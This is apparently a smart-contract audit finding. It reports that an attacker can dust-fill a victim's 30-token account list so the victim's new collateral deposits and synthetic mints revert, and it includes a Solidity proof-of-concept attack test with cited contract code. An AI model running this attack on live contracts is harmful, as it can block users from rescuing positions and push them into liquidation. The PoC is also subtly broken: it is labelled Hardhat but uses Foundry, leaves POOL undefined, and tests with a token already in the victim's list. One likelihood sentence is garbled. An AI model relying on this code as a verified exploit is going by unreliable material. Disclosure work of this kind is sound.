### Title
Attacker can permanently DoS a victim's ability to deposit new collateral types or mint new synthetic positions by dust-filling the victim's `MAX_TOKENS_PER_USER` token list - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
`DepositToken` implements a fully permissionless ERC20 `transfer`/`transferFrom`, and every `_transfer` that gives a recipient a non-zero balance calls `pool.addToDepositTokensOfAccount(recipient)`, which reverts with `UserReachedMaxTokens` once `debtTokensOfAccount + depositTokensOfAccount` reaches `MAX_TOKENS_PER_USER` (30). An unprivileged attacker can therefore cheaply dust every whitelisted msdTOKEN to a victim address, filling all 30 slots, after which any call path that would add a *new* deposit token (victim's own `deposit`, a liquidator-free `seize`, SmartFarmingManager deposits on behalf) or a new debt token (`DebtToken.issue`) for that account permanently reverts. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
- `Pool.MAX_TOKENS_PER_USER = 30` is a hard cap on the combined length of `debtTokensOfAccount[account]` and `depositTokensOfAccount[account]` [5](#0-4) .
- `addToDepositTokensOfAccount` is only callable by registered deposit tokens, but registration is irrelevant to the attacker: the attacker moves *existing, whitelisted* msdTOKENs, so the cap check is the only gate [4](#0-3) .
- `DepositToken._transfer` adds the token to the recipient's list whenever the recipient's prior balance was zero, with no opt-in and no minimum amount [2](#0-1) .
- `transfer`/`transferFrom` only check `_revertIfLocked(sender_)`; the recipient's consent or list capacity is never checked before the send itself (capacity is only enforced inside `addToDepositTokensOfAccount`, which reverts the whole tx — so the attacker fills slots one token at a time) [6](#0-5) .
- Once the victim is at 30/30: `deposit(amount, onBehalfOf = victim)` on any deposit token not already in the victim's list reverts inside `_mint` → `addToDepositTokensOfAccount` [7](#0-6) ; `DebtToken.issue` for any new synthetic reverts the same way via `addToDebtTokensOfAccount` [8](#0-7) .
- Self-recovery is unreliable: if the victim has open debt, the dust balances count toward collateral via `depositOf`, but more importantly `_revertIfLocked` can prevent the victim from transferring the dust back out, since `unlockedBalanceOf` shrinks as health deteriorates [9](#0-8) . A victim approaching liquidation can be permanently blocked from adding collateral to rescue the position.

### Impact Explanation
This is the on-chain analog of the reported unauthenticated-DoS: any EOA, with no privileges and only dust amounts of whitelisted deposit tokens, can remotely cripple a target account's core protocol functions. The liveness invariant "any account may deposit any listed collateral and mint any listed synthetic" is broken per-victim. Concretely: a borrower whose health factor is degrading is prevented from depositing a different collateral type (or minting/repaying flows that require a new token entry) to avoid liquidation, causing forced liquidation / loss of collateral that would otherwise have been avoidable — temporary freezing of funds escalating to direct loss through liquidation.

### Likelihood Explanation
Cost is ~30 trivial `transfer` calls of economically negligible amounts (the attacker retains almost everything by keeping tokens on other slots or cycling: send dust of token i to victim, repeat for each of the ~10–15 whitelisted deposit tokens plus forcing debt tokens is not needed — deposit tokens alone fill the cap since the cap is on the combined length). No privileged role, oracle manipulation, or governance action is required; `onlyIfAdditionWillNotReachMaxTokens`, `nonReentrant`, pause flags, and SynthContext sender checks do not mitigate it because the attacker only exercises the normal public ERC20 path. Mitigating factor: the victim can remove dust entries by transferring/withdrawing those dust balances *if* they remain unlocked, which keeps this from being a guaranteed permanent freeze in all states.

### Recommendation
- Do not mutate the victim's per-account list on plain `transfer`/`transferFrom` receipts; only track tokens the account actually deposited (`_mint`/`deposit`/`seize` paths), or gate list insertion behind a minimum meaningful amount.
- Alternatively, treat `addToDepositTokensOfAccount` capacity overflow as non-fatal for transfers initiated by third parties, or allow list eviction of zero-cost dust entries.
- At minimum, let recipients remove list entries themselves (a `Pool`-level function that deletes a token entry after transferring the residual balance out) so the attack is always recoverable regardless of lock state.

### Proof of Concept
Hardhat-style PoC (assumes a deployed pool with ≥1 whitelisted `DepositToken` per slot; use N distinct whitelisted deposit tokens up to 30):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IPool} from "contracts/interfaces/IPool.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract DustListDoS is Test {
    IPool pool = IPool(POOL);
    address victim = address(0xBEEF);
    address attacker = address(0xA77);

    function test_fillVictimTokenList() public {
        // Collect all whitelisted deposit tokens
        address[] memory dts = pool.getDepositTokens(); // <= 30 needed
        vm.startPrank(attacker);
        for (uint256 i; i < dts.length; ++i) {
            IDepositToken dt = IDepositToken(dts[i]);
            IERC20 underlying = dt.underlying();
            deal(address(underlying), attacker, 1e6);
            underlying.approve(address(dt), 1e6);
            dt.deposit(1e6, attacker);       // attacker mints msdTOKEN to self
            dt.transfer(victim, 1);          // 1 wei dust -> adds entry to victim's list
        }
        vm.stopPrank();

        assertEq(pool.getDepositTokensOfAccount(victim).length, dts.length);
        assertGe(
            pool.getDepositTokensOfAccount(victim).length
              + pool.getDebtTokensOfAccount(victim).length,
            pool.MAX_TOKENS_PER_USER()
        );

        // Victim's own fresh deposit of ANY new collateral now reverts
        IDepositToken newDt = IDepositToken(pool.getDepositTokens()[0]); // any token not yet in victim list works; use a second pool token set or a freshly added one
        IERC20 u = newDt.underlying();
        vm.startPrank(victim);
        deal(address(u), victim, 1e6);
        u.approve(address(newDt), 1e6);
        vm.expectRevert(IPool.UserReachedMaxTokens.selector);
        newDt.deposit(1e6, victim);
        vm.stopPrank();
    }
}
```

The revert propagates from `DepositToken._mint` → `Pool.addToDepositTokensOfAccount` → `onlyIfAdditionWillNotReachMaxTokens`, matching the `UserReachedMaxTokens` revert shown in the test suite [10](#0-9) .

### Citations

**File:** contracts/DepositToken.sol (L211-236)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
```

**File:** contracts/DepositToken.sol (L348-376)
```text
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
    }

    /// @inheritdoc IERC20
    function transferFrom(
        address sender_,
        address recipient_,
        uint256 amount_
    ) external override nonReentrant returns (bool) {
        _revertIfLocked(sender_, amount_);

        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[sender_][_msgSender];
        if (_currentAllowance != type(uint256).max) {
            if (_currentAllowance < amount_) revert AmountExceedsAllowance();
            unchecked {
                _approve(sender_, _msgSender, _currentAllowance - amount_);
            }
        }

        _transfer(sender_, recipient_, amount_);

        return true;
    }
```

**File:** contracts/DepositToken.sol (L383-398)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
    }
```

**File:** contracts/DepositToken.sol (L517-520)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }
```

**File:** contracts/Pool.sol (L79-79)
```text
    uint256 public constant MAX_TOKENS_PER_USER = 30;
```

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-208)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }
```

**File:** contracts/Pool.sol (L216-220)
```text
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** test/Pool.test.ts (L1386-1416)
```typescript
      it('should revert when reach max tokens', async function () {
        // given
        const max = (await pool.MAX_TOKENS_PER_USER()).toNumber()
        const accountAddress = ethers.utils.hexlify(ethers.utils.randomBytes(20))

        for (let i = 0; i < max / 2; ++i) {
          const deposit = await smock.fake('DepositToken')
          deposit.underlying.returns(ethers.utils.hexlify(ethers.utils.randomBytes(20)))
          await setCode(deposit.address, '0x01')
          await setBalance(deposit.address, parseEther('1'))

          await pool.addDepositToken(deposit.address)
          await pool.connect(deposit.wallet).addToDepositTokensOfAccount(accountAddress)
        }

        for (let i = 0; i < max / 2; ++i) {
          const debt = await smock.fake('DebtToken')
          debt.syntheticToken.returns(ethers.utils.hexlify(ethers.utils.randomBytes(20)))
          await setCode(debt.address, '0x01')
          await setBalance(debt.address, parseEther('1'))

          await pool.addDebtToken(debt.address)
          await pool.connect(debt.wallet).addToDebtTokensOfAccount(accountAddress)
        }

        // then
        const tx = pool.connect(msdTOKEN.wallet).addToDepositTokensOfAccount(accountAddress)

        // when
        await expect(tx).revertedWithCustomError(pool, 'UserReachedMaxTokens')
      })
```
